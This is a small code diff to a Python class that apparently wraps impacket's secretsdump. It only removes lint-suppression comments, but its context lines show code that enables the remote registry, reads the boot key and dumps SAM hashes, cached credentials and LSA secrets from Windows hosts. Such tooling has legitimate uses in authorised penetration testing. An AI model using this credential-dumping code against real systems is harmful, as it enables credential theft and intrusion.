@@ -51,7 +51,7 @@ class SecretsdumpLocal:
         try:
             remote.enableRegistry()
             bootkey = remote.getBootKey()
-        except Exception as exc:  # noqa: BLE001
+        except Exception as exc:
             raise RuntimeError(f"registry enable / bootkey failed: {exc}") from exc
 
         sam_records: list[str] = []
@@ -67,7 +67,7 @@ class SecretsdumpLocal:
             sam = SAMHashes(None, bootkey, isRemote=True, remoteOps=remote, perSecretCallback=_sam)
             sam.dump()
             sam.finish()
-        except Exception as exc:  # noqa: BLE001
+        except Exception as exc:
             console.print(f"[yellow]SAM: {exc}[/yellow]")
         try:
             lsa = LSASecrets(
@@ -81,7 +81,7 @@ class SecretsdumpLocal:
             lsa.dumpCachedHashes()
             lsa.dumpSecrets()
             lsa.finish()
-        except Exception as exc:  # noqa: BLE001
+        except Exception as exc:
             console.print(f"[yellow]LSA: {exc}[/yellow]")
         with contextlib.suppress(Exception):
             remote.finish()
